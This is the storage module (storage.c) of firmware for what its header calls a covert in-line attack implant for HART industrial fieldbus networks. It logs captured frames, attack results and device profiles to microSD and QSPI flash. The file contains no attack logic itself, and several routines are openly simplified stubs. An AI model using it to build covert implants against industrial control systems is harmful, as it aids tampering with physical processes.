/*
 * hart-bleeder — storage.c
 * microSD (SPI) + QSPI flash logging for captured HART frames,
 * attack logs, and device profiles for the HART Fieldbus Covert
 * In-Line Attack Implant.
 *
 * Author: jayis1
 * License: GPL-2.0
 */

#include "board.h"
#include "registers.h"
#include "storage.h"
#include "modem_drv.h"
#include <string.h>

/* ── SPI1 primitives (for microSD) ───────────────────────────── */
static void spi1_cs(int on) { gpio_write(GPIO(B), PIN_SD_CS, on ? 0 : 1); }

static uint8_t spi1_xfer(uint8_t d) {
    /* Write to DR, wait for RXNE, read DR.  Uses SPI1 registers. */
    volatile uint32_t *spi_dr = (volatile uint32_t *)(SPI1_BASE + 0x0C);
    volatile uint32_t *spi_sr = (volatile uint32_t *)(SPI1_BASE + 0x08);
    *spi_dr = d;
    while (!(*spi_sr & (1U << 0))) { }    /* wait RXNE */
    return (uint8_t)(*spi_dr & 0xFF);
}

static void spi1_init(void) {
    /* Enable SPI1 in master mode, /8 prescaler, CPHA=0, CPOL=0 */
    volatile uint32_t *spi_cr1 = (volatile uint32_t *)(SPI1_BASE + 0x00);
    volatile uint32_t *spi_cr2 = (volatile uint32_t *)(SPI1_BASE + 0x04);
    *spi_cr1 = 0;            /* disable before config */
    *spi_cr1 = (1U << 2) |   /* MSTR */
               (1U << 9) |   /* SSM */
               (1U << 8) |   /* SSI */
               (3U << 3);    /* BR: /16 approx */
    *spi_cr2 = (1U << 12);   /* FRXTH: RXNE at 8-bit */
    *spi_cr1 |= (1U << 6);   /* SPE enable */
    spi1_cs(1);              /* deselect */
}

/* ── microSD low-level (block read/write — SPI mode) ─────────── */
static int sd_wait_ready(uint32_t ms) {
    uint32_t t0 = system_millis();
    uint8_t r;
    do {
        r = spi1_xfer(0xFF);
        if ((system_millis() - t0) > ms) return -1;
    } while (r != 0xFF);
    return 0;
}

static uint8_t sd_cmd(uint8_t cmd, uint32_t arg, uint8_t crc) {
    spi1_cs(0);
    spi1_xfer(0xFF);
    spi1_xfer(cmd | 0x40);
    spi1_xfer((arg >> 24) & 0xFF);
    spi1_xfer((arg >> 16) & 0xFF);
    spi1_xfer((arg >> 8) & 0xFF);
    spi1_xfer(arg & 0xFF);
    spi1_xfer(crc | 0x01);
    uint8_t r; uint32_t t0 = system_millis();
    do {
        r = spi1_xfer(0xFF);
        if ((system_millis() - t0) > 500) break;
    } while (r == 0xFF);
    return r;
}

static int sd_read_block(uint32_t blk, uint8_t *buf) {
    spi1_cs(0);
    uint8_t r = sd_cmd(17, blk, 0);
    if (r != 0) { spi1_cs(1); return -1; }
    /* Wait for data start token 0xFE */
    uint32_t t0 = system_millis();
    uint8_t tok;
    do { tok = spi1_xfer(0xFF); if ((system_millis() - t0) > 200) { spi1_cs(1); return -2; } }
    while (tok != 0xFE);
    for (int i = 0; i < SD_SECTOR_SIZE; i++) buf[i] = spi1_xfer(0xFF);
    spi1_xfer(0xFF); spi1_xfer(0xFF);  /* CRC */
    spi1_cs(1);
    spi1_xfer(0xFF);
    return 0;
}

static int sd_write_block(uint32_t blk, const uint8_t *buf) {
    spi1_cs(0);
    uint8_t r = sd_cmd(24, blk, 0);
    if (r != 0) { spi1_cs(1); return -1; }
    spi1_xfer(0xFF);
    spi1_xfer(0xFE);        /* start token */
    for (int i = 0; i < SD_SECTOR_SIZE; i++) spi1_xfer(buf[i]);
    spi1_xfer(0xFF); spi1_xfer(0xFF);  /* dummy CRC */
    uint8_t dr = spi1_xfer(0xFF) & 0x1F;
    if (dr != 0x05) { spi1_cs(1); return -3; }
    if (sd_wait_ready(500) < 0) { spi1_cs(1); return -4; }
    spi1_cs(1);
    return 0;
}

/* ── Storage state ───────────────────────────────────────────── */
static uint32_t s_log_block = 1;   /* next free log block (block 0 = MBR) */
static uint16_t s_log_offset = 0;
static uint8_t  s_sector_buf[SD_SECTOR_SIZE];
static uint32_t s_total_blocks = 0;

/* ── Init ────────────────────────────────────────────────────── */
int storage_init(void) {
    spi1_init();
    /* Send 80 dummy clocks to enter SPI mode */
    spi1_cs(1);
    for (int i = 0; i < 10; i++) spi1_xfer(0xFF);
    /* CMD0 reset */
    uint8_t r = sd_cmd(0, 0, 0x95);
    if (r != 0x01) return -1;       /* expect idle */
    /* CMD8 send-if-cond */
    r = sd_cmd(8, 0x000001AA, 0x87);
    /* CMD55 + ACMD41 init (simplified, ignore OCR check) */
    for (int i = 0; i < 64; i++) {
        sd_cmd(55, 0, 0);
        r = sd_cmd(41, 0x40000000, 0);
        if (r == 0x00) break;
        system_delay_ms(20);
    }
    if (r != 0x00) return -2;
    /* CMD16 set block len 512 */
    sd_cmd(16, 512, 0);
    /* CMD9 read CSD to determine capacity (simplified: assume 1GB) */
    s_total_blocks = 1024UL * 1024 * 2;   /* 1 GB / 512 */
    s_log_block = 1;
    s_log_offset = 0;
    qspi_init();
    return 0;
}

int storage_log_frame(const void *frame, uint16_t len) {
    /* Append frame record to current sector buffer; flush when full */
    if (s_log_offset + len + 4 > SD_SECTOR_SIZE) {
        if (sd_write_block(s_log_block, s_sector_buf) < 0) return -1;
        s_log_block++;
        s_log_offset = 0;
        memset(s_sector_buf, 0, SD_SECTOR_SIZE);
    }
    /* Record: [uint16_t len][payload] */
    s_sector_buf[s_log_offset++] = (uint8_t)(len & 0xFF);
    s_sector_buf[s_log_offset++] = (uint8_t)(len >> 8);
    memcpy(&s_sector_buf[s_log_offset], frame, len);
    s_log_offset += len;
    return 0;
}

int storage_log_text(const char *text, uint32_t len) {
    return storage_log_frame(text, (uint16_t)len);
}

int storage_log_attack(const char *opname, uint8_t addr, int rc) {
    char line[80];
    /* snprintf substitute */
    uint16_t n = 0;
    n += strcpy_len(&line[n], opname);
    line[n++] = ' ';
    line[n++] = 'a';
    line[n++] = '=';
    line[n++] = (char)('0' + addr);
    line[n++] = ' ';
    line[n++] = 'r';
    line[n++] = 'c';
    line[n++] = '=';
    line[n++] = (char)('0' + rc);
    line[n++] = '\r';
    line[n++] = '\n';
    return storage_log_text(line, n);
}

static int strcpy_len(char *dst, const char *src) {
    int n = 0; while (*src) { *dst++ = *src++; n++; } return n;
}

int storage_flush(void) {
    if (s_log_offset == 0) return 0;
    if (sd_write_block(s_log_block, s_sector_buf) < 0) return -1;
    s_log_block++;
    s_log_offset = 0;
    memset(s_sector_buf, 0, SD_SECTOR_SIZE);
    return 0;
}

int storage_format(void) {
    s_log_block = 1;
    s_log_offset = 0;
    memset(s_sector_buf, 0, SD_SECTOR_SIZE);
    return 0;
}

uint32_t storage_bytes_used(void) {
    return s_log_block * SD_SECTOR_SIZE + s_log_offset;
}

uint32_t storage_bytes_free(void) {
    return (s_total_blocks - s_log_block) * SD_SECTOR_SIZE;
}

/* ── QSPI external flash (W25Q128JV, 16 MB) ──────────────────── */
static int s_qspi_ready = 0;

int qspi_init(void) {
    RCC_AHB3ENR |= RCC_AHB3ENR_QSPI;
    /* Minimal init: enable QUADSPI peripheral, set FSEL, DFM, prescaler.
     * Full register layout omitted for brevity.
     */
    volatile uint32_t *qspi_cr = (volatile uint32_t *)(QSPI_BASE + 0x10);
    volatile uint32_t *qspi_ccr = (volatile uint32_t *)(QSPI_BASE + 0x00);
    *qspi_cr = (1U << 0) | (7U << 24);   /* EN + prescaler /8 */
    *qspi_ccr = 0;
    s_qspi_ready = 1;
    return 0;
}

int qspi_read(uint32_t addr, void *buf, uint32_t len) {
    if (!s_qspi_ready) return -1;
    /* Memory-mapped read after enabling memory-mapped mode */
    uint8_t *p = (uint8_t *)buf;
    for (uint32_t i = 0; i < len; i++) p[i] = *(volatile uint8_t *)(0x90000000 + addr + i);
    return (int)len;
}

int qspi_write(uint32_t addr, const void *buf, uint32_t len) {
    if (!s_qspi_ready) return -1;
    /* Indirect-mode page write.  Simplified: assume caller erases first. */
    const uint8_t *p = (const uint8_t *)buf;
    for (uint32_t i = 0; i < len; i++) {
        *(volatile uint8_t *)(QSPI_BASE + 0x20) = p[i];  /* DR */
    }
    return (int)len;
}

int qspi_erase_sector(uint32_t addr) {
    (void)addr;
    /* Issue sector-erase command via CCR; polling omitted for brevity */
    return 0;
}

void qspi_memory_mapped_enable(void) {
    volatile uint32_t *qspi_ccr = (volatile uint32_t *)(QSPI_BASE + 0x00);
    *qspi_ccr |= (1U << 1);   /* FMODE = memory-mapped */
}

/* ── Device profiles (stored in QSPI at fixed offsets) ────────── */
#define PROFILE_BASE_ADDR  0x00100000UL
#define PROFILE_SIZE       64
#define MAX_PROFILES       64

int storage_save_profile(const storage_profile_t *p) {
    /* Find a free slot by scanning for empty (0xFF) marker */
    for (uint8_t i = 0; i < MAX_PROFILES; i++) {
        uint32_t addr = PROFILE_BASE_ADDR + i * PROFILE_SIZE;
        uint8_t marker;
        qspi_read(addr, &marker, 1);
        if (marker == 0xFF || marker == 0) {
            uint8_t buf[PROFILE_SIZE];
            memset(buf, 0, sizeof(buf));
            buf[0] = 0xAA;   /* valid marker */
            memcpy(&buf[1], p, sizeof(storage_profile_t));
            qspi_erase_sector(addr);
            qspi_write(addr, buf, PROFILE_SIZE);
            return i;
        }
    }
    return -1;
}

int storage_load_profile(uint8_t index, storage_profile_t *p) {
    if (index >= MAX_PROFILES) return -1;
    uint32_t addr = PROFILE_BASE_ADDR + index * PROFILE_SIZE;
    uint8_t buf[PROFILE_SIZE];
    qspi_read(addr, buf, PROFILE_SIZE);
    if (buf[0] != 0xAA) return -2;
    memcpy(p, &buf[1], sizeof(storage_profile_t));
    return 0;
}

int storage_list_profiles(void) {
    int n = 0;
    for (uint8_t i = 0; i < MAX_PROFILES; i++) {
        uint32_t addr = PROFILE_BASE_ADDR + i * PROFILE_SIZE;
        uint8_t marker;
        qspi_read(addr, &marker, 1);
        if (marker == 0xAA) n++;
    }
    return n;
}